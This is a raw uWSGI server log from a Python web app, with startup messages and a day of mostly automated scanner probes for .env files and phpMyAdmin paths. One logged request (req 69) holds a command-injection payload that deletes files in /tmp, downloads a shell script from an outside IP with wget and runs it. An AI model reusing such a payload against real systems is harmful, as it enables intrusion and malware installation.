@@ -1,0 +1,294 @@
+*** Starting uWSGI 2.0.20 (64bit) on [Wed Sep 28 13:01:36 2022] ***
+compiled with version: 10.2.1 20210110 on 28 September 2022 12:59:36
+os: Linux-5.4.0-1085-aws #92~18.04.1-Ubuntu SMP Wed Aug 31 17:21:08 UTC 2022
+nodename: 16f969d64597
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/popol
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/popol/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.13 (default, Aug 23 2022, 10:02:06)  [GCC 10.2.1 20210110]
+Python main interpreter initialized at 0x55cc414d91d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 4000 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55cc414d91d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 6, cores: 2)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/popol/apps.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.20 (64bit) on [Wed Sep 28 13:03:46 2022] ***
+compiled with version: 10.2.1 20210110 on 28 September 2022 12:59:36
+os: Linux-5.4.0-1085-aws #92~18.04.1-Ubuntu SMP Wed Aug 31 17:21:08 UTC 2022
+nodename: 16f969d64597
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/popol
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/popol/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.13 (default, Aug 23 2022, 10:02:06)  [GCC 10.2.1 20210110]
+Python main interpreter initialized at 0x55a426e9b0f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 4000 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55a426e9b0f0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Wed Sep 28 13:03:54 2022 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.20 (64bit) on [Wed Sep 28 13:03:55 2022] ***
+compiled with version: 10.2.1 20210110 on 28 September 2022 13:02:04
+os: Linux-5.4.0-1085-aws #92~18.04.1-Ubuntu SMP Wed Aug 31 17:21:08 UTC 2022
+nodename: aa016bf095c3
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/popol
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/popol/apps.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.13 (default, Aug 23 2022, 10:02:06)  [GCC 10.2.1 20210110]
+Python main interpreter initialized at 0x55ec83e781d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 4000 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ec83e781d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 6, cores: 2)
+[pid: 6|app: 0|req: 1/1] 117.20.198.6 () {44 vars in 925 bytes} [Wed Sep 28 13:04:23 2022] GET / => generated 12989 bytes in 161 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 6|app: 0|req: 2/2] 117.20.198.6 () {44 vars in 872 bytes} [Wed Sep 28 13:04:24 2022] GET /favicon.ico => generated 2345 bytes in 10 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 3/3] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 14:06:38 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 4/4] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 14:06:38 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /c/
+[pid: 6|app: 0|req: 5/5] 180.149.125.163 () {34 vars in 481 bytes} [Wed Sep 28 14:21:13 2022] GET /c/ => generated 2308 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 6/6] 95.214.235.205 () {36 vars in 514 bytes} [Wed Sep 28 14:46:26 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 7/7] 95.214.235.205 () {40 vars in 621 bytes} [Wed Sep 28 14:46:26 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 8/8] 223.38.62.93 () {40 vars in 679 bytes} [Wed Sep 28 14:56:08 2022] GET / => generated 12989 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 9/9] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 15:02:12 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 10/10] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 15:02:13 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /db/phpmyadmin3/index.php
+[pid: 6|app: 0|req: 11/11] 129.151.230.90 () {32 vars in 522 bytes} [Wed Sep 28 15:11:58 2022] GET /db/phpmyadmin3/index.php?lang=en => generated 2382 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /db/dbadmin/index.php
+[pid: 6|app: 0|req: 12/12] 129.151.230.90 () {32 vars in 514 bytes} [Wed Sep 28 15:11:58 2022] GET /db/dbadmin/index.php?lang=en => generated 2370 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /MyAdmin/index.php
+[pid: 6|app: 0|req: 13/13] 129.151.230.90 () {32 vars in 508 bytes} [Wed Sep 28 15:11:58 2022] GET /MyAdmin/index.php?lang=en => generated 2361 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /phpMyAdmin-5.2.0/index.php
+[pid: 6|app: 0|req: 14/14] 129.151.230.90 () {32 vars in 526 bytes} [Wed Sep 28 15:11:59 2022] GET /phpMyAdmin-5.2.0/index.php?lang=en => generated 2388 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 15/15] 95.214.235.205 () {36 vars in 514 bytes} [Wed Sep 28 15:16:26 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 16/16] 95.214.235.205 () {40 vars in 621 bytes} [Wed Sep 28 15:16:26 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 17/17] 193.118.53.210 () {34 vars in 478 bytes} [Wed Sep 28 16:01:40 2022] GET / => generated 12989 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /showLogin.cc
+[pid: 6|app: 0|req: 18/18] 193.118.53.210 () {34 vars in 502 bytes} [Wed Sep 28 16:01:43 2022] GET /showLogin.cc => generated 2338 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 19/19] 185.254.196.115 () {36 vars in 515 bytes} [Wed Sep 28 16:03:18 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 20/20] 185.254.196.115 () {40 vars in 622 bytes} [Wed Sep 28 16:03:18 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 21/21] 87.236.176.138 () {36 vars in 472 bytes} [Wed Sep 28 16:12:34 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 22/22] 35.195.93.98 () {42 vars in 552 bytes} [Wed Sep 28 16:13:57 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 23/23] 139.162.215.70 () {34 vars in 478 bytes} [Wed Sep 28 16:23:51 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 24/24] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 16:40:54 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 25/25] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 16:40:54 2022] GET /.env => generated 2314 bytes in 5 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 26/26] 157.245.203.107 () {32 vars in 405 bytes} [Wed Sep 28 17:12:32 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 217 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 27/27] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 17:43:48 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 28/28] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 17:43:48 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 29/29] 95.214.235.205 () {36 vars in 514 bytes} [Wed Sep 28 17:52:17 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 30/30] 95.214.235.205 () {40 vars in 621 bytes} [Wed Sep 28 17:52:19 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /config/getuser
+[pid: 6|app: 0|req: 31/31] 157.230.212.200 () {40 vars in 663 bytes} [Wed Sep 28 18:02:33 2022] GET /config/getuser?index=0 => generated 2355 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 32/32] 128.199.151.134 () {34 vars in 385 bytes} [Wed Sep 28 18:24:18 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 33/33] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 18:44:13 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 34/34] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 18:44:13 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 35/35] 128.14.134.134 () {34 vars in 478 bytes} [Wed Sep 28 18:55:40 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 36/36] 185.254.196.115 () {36 vars in 515 bytes} [Wed Sep 28 19:10:35 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 37/37] 185.254.196.115 () {40 vars in 622 bytes} [Wed Sep 28 19:10:35 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 38/38] 185.254.196.115 () {36 vars in 515 bytes} [Wed Sep 28 19:14:30 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 39/39] 185.254.196.115 () {40 vars in 622 bytes} [Wed Sep 28 19:14:31 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /fuN3
+[pid: 6|app: 0|req: 40/40] 172.104.138.223 () {30 vars in 431 bytes} [Wed Sep 28 19:43:56 2022] GET /fuN3 => generated 2310 bytes in 4 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 41/41] 89.40.54.110 () {32 vars in 459 bytes} [Wed Sep 28 20:35:57 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 42/42] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 20:46:34 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 43/43] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 20:46:34 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 44/44] 95.214.235.205 () {36 vars in 514 bytes} [Wed Sep 28 21:17:16 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 45/45] 95.214.235.205 () {40 vars in 621 bytes} [Wed Sep 28 21:17:16 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 46/46] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 21:43:40 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 47/47] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 21:43:40 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 48/48] 128.199.151.134 () {34 vars in 385 bytes} [Wed Sep 28 21:44:09 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 49/49] 205.210.31.156 () {30 vars in 578 bytes} [Wed Sep 28 22:33:43 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 217 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 50/50] 135.125.246.110 () {40 vars in 622 bytes} [Wed Sep 28 23:30:56 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 51/51] 135.125.246.110 () {36 vars in 515 bytes} [Wed Sep 28 23:30:57 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 52/52] 125.42.172.80 () {26 vars in 270 bytes} [Wed Sep 28 23:37:29 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 217 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 53/53] 185.254.196.115 () {36 vars in 515 bytes} [Wed Sep 28 23:57:38 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 54/54] 185.254.196.115 () {40 vars in 622 bytes} [Wed Sep 28 23:57:39 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 55/55] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 00:15:33 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 56/56] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 00:15:34 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 57/57] 34.65.92.220 () {34 vars in 372 bytes} [Thu Sep 29 00:38:43 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 58/58] 167.71.192.153 () {34 vars in 473 bytes} [Thu Sep 29 00:50:14 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /0bef
+[pid: 6|app: 0|req: 59/59] 172.104.242.173 () {26 vars in 281 bytes} [Thu Sep 29 01:38:18 2022] GET /0bef => generated 2310 bytes in 4 msecs (HTTP/1.0 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 60/60] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 01:43:26 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 61/61] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 01:43:26 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 62/62] 183.136.225.9 () {34 vars in 448 bytes} [Thu Sep 29 01:50:55 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /robots.txt
+[pid: 6|app: 0|req: 63/63] 183.136.225.9 () {36 vars in 529 bytes} [Thu Sep 29 01:50:55 2022] GET /robots.txt => generated 2335 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 64/64] 177.185.157.41 () {32 vars in 461 bytes} [Thu Sep 29 02:30:00 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 65/65] 185.254.196.115 () {36 vars in 515 bytes} [Thu Sep 29 02:59:49 2022] GET /.env => generated 2314 bytes in 44 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 66/66] 185.254.196.115 () {40 vars in 622 bytes} [Thu Sep 29 02:59:49 2022] POST / => generated 41 bytes in 3 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 67/67] 95.214.235.205 () {36 vars in 514 bytes} [Thu Sep 29 03:02:17 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 68/68] 95.214.235.205 () {40 vars in 621 bytes} [Thu Sep 29 03:02:17 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /shell
+[pid: 6|app: 0|req: 69/69] 124.222.61.212 () {34 vars in 571 bytes} [Thu Sep 29 03:12:19 2022] GET /shell?cd+/tmp;rm+-rf+*;wget+79.110.62.227/lol.sh;sh+/tmp/lol.sh => generated 0 bytes in 23 msecs (HTTP/1.1 404) 5 headers in 0 bytes (0 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 70/70] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 03:19:39 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 71/71] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 03:19:39 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 72/72] 128.199.151.134 () {34 vars in 385 bytes} [Thu Sep 29 03:47:43 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 73/73] 205.210.31.3 () {30 vars in 587 bytes} [Thu Sep 29 04:09:10 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 74/74] 128.14.209.162 () {34 vars in 478 bytes} [Thu Sep 29 04:21:43 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 75/75] 95.214.235.205 () {36 vars in 514 bytes} [Thu Sep 29 04:38:27 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 76/76] 95.214.235.205 () {40 vars in 621 bytes} [Thu Sep 29 04:38:27 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 77/77] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 05:17:42 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 78/78] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 05:17:42 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 79/79] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 05:44:11 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 80/80] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 05:44:12 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 6|app: 0|req: 81/81] 216.218.206.103 () {34 vars in 497 bytes} [Thu Sep 29 05:50:58 2022] GET /favicon.ico => generated 2335 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 82/82] 95.214.235.205 () {36 vars in 514 bytes} [Thu Sep 29 06:15:04 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 83/83] 95.214.235.205 () {40 vars in 621 bytes} [Thu Sep 29 06:15:04 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+Not Found: /apple-touch-icon.png
+[pid: 6|app: 0|req: 85/84] 1.251.75.137 () {38 vars in 540 bytes} [Thu Sep 29 06:24:11 2022] GET /favicon.ico => generated 2345 bytes in 9 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 85/85] 1.251.75.137 () {38 vars in 558 bytes} [Thu Sep 29 06:24:11 2022] GET /apple-touch-icon.png => generated 2372 bytes in 10 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Not Found: /apple-touch-icon-precomposed.png
+[pid: 6|app: 0|req: 86/86] 1.251.75.137 () {38 vars in 582 bytes} [Thu Sep 29 06:24:11 2022] GET /apple-touch-icon-precomposed.png => generated 2408 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 6|app: 0|req: 87/87] 1.251.75.137 () {40 vars in 705 bytes} [Thu Sep 29 06:24:11 2022] GET / => generated 12989 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+[pid: 6|app: 0|req: 88/88] 192.241.216.72 () {34 vars in 384 bytes} [Thu Sep 29 06:44:04 2022] GET / => generated 12989 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 217 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 89/89] 95.214.235.205 () {36 vars in 514 bytes} [Thu Sep 29 07:04:28 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 90/90] 95.214.235.205 () {40 vars in 621 bytes} [Thu Sep 29 07:04:28 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 6|app: 0|req: 91/91] 95.214.235.205 () {36 vars in 514 bytes} [Thu Sep 29 07:09:11 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 92/92] 95.214.235.205 () {40 vars in 621 bytes} [Thu Sep 29 07:09:13 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Method Not Allowed: /
+[pid: 6|app: 0|req: 93/93] 135.125.246.110 () {40 vars in 622 bytes} [Thu Sep 29 07:36:28 2022] POST / => generated 41 bytes in 1 msecs (HTTP/1.1 405) 7 headers in 222 bytes (1 switches on core 0)
+Not Found: /.env
+[pid: 6|app: 0|req: 94/94] 135.125.246.110 () {36 vars in 515 bytes} [Thu Sep 29 07:36:28 2022] GET /.env => generated 2314 bytes in 4 msecs (HTTP/1.1 404) 5 headers in 159 bytes (1 switches on core 1)
